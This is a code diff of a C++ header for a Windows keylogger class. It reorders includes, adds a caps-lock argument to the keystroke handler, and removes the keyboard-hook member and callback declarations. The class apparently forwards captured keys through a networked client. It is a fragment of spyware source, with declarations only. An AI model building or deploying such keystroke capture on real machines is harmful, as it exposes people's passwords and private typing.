@@ -5,27 +5,20 @@
 #endif
 
 #include "WinSock2.h"
-#include <iostream>
 #include <Windows.h>
 #include <fstream>
-#include "client_keylogger.h"
-#include "kqnet.h"
-#include "common.h"
+#include <iostream>
 
-class keylogger
-{
-public:
+#include "client_keylogger.h"
+#include "common.h"
+#include "kqnet.h"
+
+class keylogger {
+  public:
     keylogger();
     ~keylogger();
-    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status);
+    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status, bool caps);
 
-
-private:
-    HHOOK hook;
+  private:
     client_keylogger client;
-
-private:
-    static LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
-
-extern keylogger transKeys;
